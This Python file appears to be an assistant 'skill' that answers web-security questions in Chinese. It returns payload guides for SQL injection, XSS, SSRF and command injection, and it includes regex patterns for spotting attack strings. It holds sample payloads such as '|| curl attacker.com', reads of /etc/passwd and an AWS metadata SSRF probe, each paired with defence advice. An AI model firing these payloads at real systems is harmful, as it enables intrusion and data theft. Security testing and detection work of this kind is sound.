"""Web Security Skill — SQL注入/XSS/SSRF 检测与Payload生成"""
import re


def handle(question: str, context: str = "") -> str:
    """分析问题中的攻击类型，返回检测思路或 Payload 参考"""
    q = (question + " " + context).lower()

    results = []

    # SQL 注入
    if _match(q, ["sql注入", "sqli", "sql injection", "盲注", "union注入", "报错注入",
                   "延时注入", "堆叠注入", "sqlmap"]):
        results.append(_sqli_guide(q))

    # XSS
    if _match(q, ["xss", "跨站脚本", "cross site", "反射型", "存储型", "dom型"]):
        results.append(_xss_guide(q))

    # SSRF
    if _match(q, ["ssrf", "服务端请求伪造", "server side request"]):
        results.append(_ssrf_guide())

    # 命令注入
    if _match(q, ["命令注入", "command injection", "rce", "远程命令"]):
        results.append(_cmd_guide())

    if results:
        return "\n\n".join(results)

    return _detect_payloads(question)


def _match(text: str, keywords: list) -> bool:
    return any(kw in text for kw in keywords)


def _sqli_guide(q: str) -> str:
    """返回 SQL 注入检测指南"""
    guide = "[WebSecurity] SQL 注入检测：\n"
    guide += "1. 测试 payload: ' OR '1'='1  |  ' OR 1=1--  |  admin'--\n"
    guide += "2. Union 探测: ' UNION SELECT NULL--  (逐列增加 NULL)\n"
    guide += "3. 数据库指纹: @@version / version() / banner\n"
    guide += "4. 盲注: ' AND 1=1-- (真) vs ' AND 1=2-- (假)\n"
    guide += "5. 延时盲注: '; IF(1=1,SLEEP(5),0)-- (MySQL)\n"
    guide += "6. 防御: 参数化查询(预编译) > 输入过滤 > WAF"
    return guide


def _xss_guide(q: str) -> str:
    guide = "[WebSecurity] XSS 检测：\n"
    guide += "1. 反射型: <script>alert(1)</script>  → 查看源码是否原样输出\n"
    guide += "2. 存储型: 留言板/评论提交 <img src=x onerror=alert(1)>\n"
    guide += "3. DOM型: #<img src=x onerror=alert(1)>  → 检查 JS 是否用 innerHTML\n"
    guide += "4. 绕过: <ScRiPt> / <img onerror=...> / &#x61;lert(1)\n"
    guide += "5. 防御: 输出编码(Contextual Encoding) + CSP Header"
    return guide


def _ssrf_guide() -> str:
    guide = "[WebSecurity] SSRF 检测：\n"
    guide += "1. 内网探测: ?url=http://169.254.169.254/latest/meta-data/ (AWS)\n"
    guide += "2. 端口扫描: ?url=http://127.0.0.1:22 / :3306 / :6379\n"
    guide += "3. 协议利用: file:///etc/passwd / gopher:// / dict://\n"
    guide += "4. 防御: URL 白名单 + 禁用内网地址 + 禁用危险协议"
    return guide


def _cmd_guide() -> str:
    guide = "[WebSecurity] 命令注入检测：\n"
    guide += "1. 拼接测试: ; ls / | id / | whoami\n"
    guide += "2. 盲测: ; sleep 5 / | ping -c 5 127.0.0.1\n"
    guide += "3. 管道: | cat /etc/passwd / || curl attacker.com\n"
    guide += "4. 防御: 避免 system()/exec() + 参数白名单 + 最小权限"
    return guide


def _detect_payloads(question: str) -> str:
    """检测问题中是否包含攻击 payload 特征"""
    indicators = {
        "SQL注入": [r"'\s*OR\s+1=1", r"UNION\s+SELECT", r"'\s*--", r"sleep\(\d+\)",
                      r"information_schema", r"load_file", r"into\s+outfile"],
        "XSS": [r"<script>", r"alert\(.+\)", r"onerror\s*=", r"document\.cookie",
                r"<img\s+src"],
        "路径遍历": [r"\.\./\.\./", r"\.\.\\\.\.\\", r"/etc/passwd", r"boot\.ini"],
        "代码注入": [r"system\(.+\)", r"eval\(.+\)", r"exec\(.+\)", r"passthru"],
    }

    found = []
    for category, patterns in indicators.items():
        for p in patterns:
            if re.search(p, question, re.IGNORECASE):
                found.append(category)
                break

    if found:
        return f"[WebSecurity] 检测到 {', '.join(found)} 特征，建议进一步分析。"
    return "[WebSecurity] 未检测到明显攻击特征。如需具体 Payload，请说明目标类型。"
